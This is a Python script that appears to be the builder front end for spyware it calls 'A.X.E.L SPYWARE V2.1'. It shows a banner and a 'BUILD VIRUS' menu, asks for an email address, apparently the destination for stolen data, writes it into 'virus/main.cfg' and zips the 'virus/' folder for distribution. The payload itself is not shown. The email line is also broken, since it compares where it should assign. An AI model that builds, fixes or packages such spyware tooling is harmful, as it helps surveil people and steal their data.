from colorama import init
from sys import platform
from time import sleep
from configparser import ConfigParser
import os
import zipfile

def clear():
	if platform in ['win32', 'win64']:
		os.system('cls')
	else:
		try:
			os.system('clear')
		except:
			print('\033[1;37m\033[1;48;5;196mError: unsupported os', '\033[0;0m')
			exit()

init()

_points_ = ['    ', '.   ', '..  ', '... ']

for i in range(4):
	for _load_ in range(len(_points_)):
		_point_ = _points_[_load_]
		print(f'\r\033[0;38;5;202mLAUNCHING THE TOOL {_point_}', end='')
		sleep(0.2)
	if i == 3:
		sleep(1)
		clear()

print('''
\033[1;38;5;190m│\033[1;38;5;196m▒█▀▀▀█ ▒█▀▀█ ▒█░░▒█ ▀▀█▀▀ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ A.X.E.L
\033[1;38;5;190m│\033[1;38;5;197m░▀▀▀▄▄ ▒█▄▄█ ▒█▄▄▄█ ░▒█░░ ▒█▄▄▀ ▒█░░▒█ ▒█░▄▄ SPYWARE
\033[1;38;5;190m│\033[1;38;5;198m▒█▄▄▄█ ▒█░░░ ░░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄▄█ ▒█▄▄█ V2.1''')

for i in range(53):
    _load_ = '─'
    print(f'\r\033[1;38;5;190m│\033[1;38;5;199m{_load_*i}', end='')
    sleep(0.01)

print()

for i in range(26):
    _load_ = '■'
    print(f'\r\033[1;38;5;190m│\033[1;38;5;201mLOADING[{i*4}%][{_load_*i}]', end='')
    sleep(0.01)

print('''
\033[1;38;5;190m│[1] BUILD VIRUS
│[2] EXIT''')

cmd = input('└>>> ')

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))

if cmd == '1':
    parser = ConfigParser()
    parser.read('virus/main.cfg')
    parser['main']['email'] == input('\033[1;38;5;215mEmail: ')
    parser.write(open('virus/main.cfg', 'w'))
    with zipfile.ZipFile('virus.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir('virus/', zipf)
elif cmd == '2':
    print('\033[0;0m')
    sleep(2)
    clear()
else:
    print('\033[1;37m\033[1;48;5;196mError: option not found', '\033[0;0m')
    sleep(2)
    clear()